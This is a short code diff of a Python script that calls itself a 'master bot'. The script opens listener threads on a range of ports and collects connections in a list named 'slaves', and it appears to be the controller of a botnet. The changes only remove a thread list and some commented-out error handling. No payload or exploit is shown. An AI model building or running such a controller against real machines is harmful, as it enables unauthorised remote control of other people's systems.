@@ -3,8 +3,6 @@ from threading import Thread
 
 initial_port = 7777
 max_bots = 5
-
-threads = []
 slaves = []
 
 def listen(port):
@@ -18,7 +16,6 @@ def main():
     print("[+] Master bot listening for incoming connections")
     for i in range(max_bots):
         ListenerThread = Thread(target=listen,args=(i+initial_port,), daemon=True)
-        threads.append(ListenerThread)
         ListenerThread.start()
 
     while True:
@@ -46,8 +43,4 @@ def main():
 
 
 if __name__=="__main__":
-    # try:
     main()
-    # except:
-    #     print("Exiting")
-    #     exit
